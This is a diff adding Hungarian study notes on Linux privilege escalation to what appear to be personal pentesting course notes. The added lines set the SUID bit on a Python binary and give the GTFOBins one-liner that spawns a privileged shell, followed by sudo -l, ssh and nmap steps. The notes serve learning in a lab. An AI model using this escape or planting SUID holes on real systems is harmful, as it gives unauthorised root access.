@@ -299,7 +299,24 @@ ha most beírjuk a wp-login.php-nél akkor interceptet előbb offra kell tenni v
 
 basic authentication burpel nem lehet
 
+python gtfobins 
 
+sudo useradd -m -s /bin/bash csanad
+
+which python3
+sudo chmod u+s /usr/bin/python3.11
+sudo chown csanad:csanad /usr/bin/python3.11
+./python -c 'import os; os.execl("/bin/sh", "sh", "-p")'
+
+whoami
+kiírná azt h csanád
+sudo -l mihez van jogom
+studentnek a jelszavát kérné nem a csanádét mert a userid-t nem változtatja meg
+el van rejtve pl a saját home mappájában a jelszót
+aztán exit
+másik terminállal ssh csanad@feltorendogpip kéri a jelszót és csanádként vagyok bent
+utána mehet a sudo -l
+sudo nmap hogy van-e ssh port alap port lista elég
 
 
 
